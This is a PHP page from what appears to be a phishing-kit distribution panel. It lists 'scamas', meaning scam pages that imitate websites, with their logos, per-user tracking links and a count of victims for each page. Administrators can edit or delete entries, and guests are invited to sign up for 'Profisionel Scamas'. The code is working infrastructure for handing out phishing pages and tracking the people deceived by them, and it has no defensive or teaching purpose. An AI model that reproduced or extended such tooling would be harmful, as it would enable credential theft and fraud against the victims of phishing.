<?
// ################################
// #                                                             
// #  ======== Programming By supervirus ===========  
// #
// #    The Scripet Progeramed By super virus 
// #
// #  Copyright © 2011 super virus . All Rights Reserved. 
// #
// #  If you want any support vist this site.           
// #      https://www.facebook.com/l0ldz 
// #
// ################################

  if(user_level <= 0){
	echo '<div class="head_panel">Welcom to Site Coodex </div>	
				<div class="body_panel">
			<center>Sing Up for Get Your Profisionel Scamas </center><br />
			<center<a href="?do=register">Sing Up Here</a></center</div>';
	}else{
  echo ' <div class="head_panel">Welcome In Site Coodex</div>	
				<div class="body_panel">
			<table border="1" width="100%">
				<tr>
					<td  colspan="6" >
					<div class="head_panel">
						Welcome to Site Coodex ( List of victims )
					</div>
					</td>
				</tr>
				<tr class="tr3">
					<td align="center" height="32">#</td>
					<td align="center" height="32">Scama Disc</td>
					<td align="center" height="32" width="22%">Website Logo</td>
					<td align="center" height="32">Links</td>
					<td align="center" height="32">Victimes By <br />  This Scama </td>';
			if(user_level == 2){
			echo '<td align="center" height="32"> Option </td>';
			}
			echo '</tr>';
	$code_sql = "SELECT * FROM ".prifex."scamas";	
	$sqlscamainfo = mysql_query($code_sql) or die(error_sql(mysql_error(),__LINE__,__FILE__));
	$numsqlscamainfo = mysql_num_rows($sqlscamainfo);
if($numsqlscamainfo > 0){	
	while($rowscamainfo = mysql_fetch_object($sqlscamainfo)){
	$scama_id = intval($rowscamainfo->scama_id);
	$scama_desc = htmlspecialchars($rowscamainfo->scama_desc);
	$scama_url = htmlspecialchars($rowscamainfo->scama_url);
	$scama_url1 = htmlspecialchars($rowscamainfo->scama_url1);
	$scama_url2 = htmlspecialchars($rowscamainfo->scama_url2);
	$scama_url3 = htmlspecialchars($rowscamainfo->scama_url3);
	$scama_photo = htmlspecialchars($rowscamainfo->scama_photo);
	$all_vic_by_scama = all_vic_by_scama($scama_id);
	echo '		<tr class="tr1">
					<td align="center">'.$scama_id.'</td>
					<td align="center">'.$scama_desc.'</td>
					<td align="center" width="22%">
					<IMG src="'.$scama_photo.'" width="175" height="25" border=0>
					</td>
					<td align="center"><a href="'.$scama_url.user_id.'"><font size="2">Link 1</font></a><br />';
					if($scama_url1 != ''){
						echo '<a href="'.$scama_url1.user_id.'"><font size="2">Link 2</font></a><br />';
					}
					if($scama_url2 != ''){
						echo '<a href="'.$scama_url2.user_id.'"><font size="2">Link 3</font></a><br />';
					}
					if($scama_url3 != ''){
						echo '<a href="'.$scama_url3.user_id.'"><font size="2">Link 4</font></a><br />';
					}
					echo '</td>
					<td align="center">
					<b><font color="#00FF00">( '.$all_vic_by_scama.' )</font></b><br /></td>
					';
					 if(user_level == 2){
						echo '<td align="center">';
						echo '<a onclick="return confirm(\'Are you Sur To Edit This Scama ?\');" href="?do=scama&type=edit_scama&id='.$scama_id.'">
						<img alt="Edit Scama" src="image/folder_edit.gif" border="0" /></a>
						|
						<a onclick="return confirm(\'Are you Sur To Delet This Scama ?\');" href="?do=scama&type=delet_scama&id='.$scama_id.'">
						<img alt="Delet Scama" src="image/folder_delete.gif" border="0" /></a>';
						echo '</td>';
					}
					echo '	</tr>';
	}
	mysql_free_result($sqlscamainfo);
}else{
echo '<tr class="tr1">
		<td  colspan="6" height="32" align="center">
			There is Not Scamas Now 
		</td>
	</tr>';
}
		echo '</table>
				</div>';
	}

?>